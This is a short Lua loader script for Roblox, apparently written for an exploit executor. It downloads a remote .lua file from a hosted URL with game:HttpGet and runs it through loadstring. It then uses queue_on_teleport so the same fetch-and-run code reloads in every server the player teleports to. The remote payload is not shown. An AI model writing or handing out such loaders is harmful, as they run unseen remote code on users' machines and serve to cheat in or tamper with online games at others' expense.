local function main()
    if not game:IsLoaded() then
        game.Loaded:Wait()
    end
    loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/be0191b975fb1e9f0705fc2312224e1ff380518d8784419e0cc6ceae783807e1.lua"))()
end
if game:GetService("Players").LocalPlayer.OnTeleport:Connect(function(State)
    if State == Enum.TeleportState.InProgress then
        if queue_on_teleport then
            queue_on_teleport([[
                if not game:IsLoaded() then
                    game.Loaded:Wait()
                end
                local script_key = "]] .. script_key .. [["
                loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/be0191b975fb1e9f0705fc2312224e1ff380518d8784419e0cc6ceae783807e1.lua"))()
            ]])
        end
    end
end) then end
main()
